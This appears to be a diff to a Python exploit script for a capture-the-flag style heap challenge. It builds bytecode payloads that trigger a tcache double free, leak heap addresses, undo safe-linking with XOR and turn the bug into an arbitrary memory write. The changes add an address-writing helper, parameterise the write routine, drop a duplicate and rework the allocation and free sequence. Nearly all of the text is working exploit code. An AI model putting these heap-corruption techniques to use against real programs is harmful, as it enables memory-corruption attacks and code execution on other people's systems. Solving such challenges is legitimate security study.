@@ -96,7 +96,13 @@ def putaddr(n):
         st += (inst[7] + digit[n] + digit[i])
     return st
 
-def aaw(val):
+def putkthaddr(n):
+    st = ''
+    st += (inst[7] + digit[n] + digit[9]) * 7
+    st += inst[7] + digit[n] + digit[8]
+    return st
+
+def aaw(val, n):
     st = ''
     '''
     st += "".join(alloc(i) for i in range(2))
@@ -118,8 +124,9 @@ def aaw(val):
     st += memtostack(4)                     # heap chunk addr (refers itself)
     st += inst[16]                          # decrypt value (xor)
 
-    st += makebyte(64)
+    st += makebyte(n)
     st += inst[14] + inst[18]               # set arbitrary addr : heap chunk - 0x40
+                                            # one trial shift heap chunk 0x20 bytes below
     st += memtostack(0)
     st += inst[16]                          # now there are 8bytes-length value in stack
 
@@ -129,40 +136,8 @@ def aaw(val):
     st += alloc(5)                          # now mem[5] is destination
 
     st += makenum(val)
-    st += putaddr(5)
-
-    return st
-
-def aaw2(val):
-    st = ''
-    st += inst[2]
-    st += alloc(4)
-    st += inst[2] 
-    st += free(4)                   # mem[4], mem[5] will be use for aaw
-    st += inst[2]
-    st += inst[0] + digit[0]                # disable tcache_entry->key
-    st += inst[7] + digit[4] + digit[8]
-    st += inst[0] + digit[0]
-    st += inst[7] + digit[4] + digit[9]
-    st += free(4)                           # double free
-    st += inst[2]
-
-    st += memtostack(0)                     # heap ASLR base
-    st += memtostack(4)                     # heap chunk addr (refers itself)
-    st += inst[16]                          # decrypt value (xor)
-
-    st += makebyte(64)
-    st += inst[14] + inst[18]               # set arbitrary addr : heap chunk - 0x40
-    st += memtostack(0)
-    st += inst[16]                          # now there are 8bytes-length value in stack
-
-    st += numtobyte()
-    st += putaddr(4)
-    st += alloc(5)
-    st += alloc(5)                          # now mem[5] is destination
-
-    st += makenum(val)
-    st += putaddr(5)
+    st += putkthaddr(5)
+    #st += putaddr(5)
 
     return st
 
@@ -182,7 +157,30 @@ payload += getaddr(1)
 payload += alloc(9) * 7
 
 payload += inst[2] + inst[1]
-payload += aaw(0x100)
+payload += alloc(9) * 30
+payload += aaw(0x201, 0x10)
+payload += inst[2] + inst[1]
+#payload += aaw(0x201, 0x230)
+payload += aaw(0x201, 0x450)
+payload += aaw(0x301, 0x460)
+payload += inst[2] + inst[1]
+
+payload += alloc(4)
+payload += alloc(9)
+payload += alloc(2)
+payload += alloc(3)
+payload += alloc(6)
+payload += alloc(7)
+payload += alloc(8)
+payload += free(4)
+payload += free(9)
+payload += free(2)
+payload += free(3)
+payload += free(6)
+payload += free(7)
+payload += free(8)
+
+payload += free(5)
 payload += inst[2] + inst[1]
 """
 payload += inst[2] + inst[1]
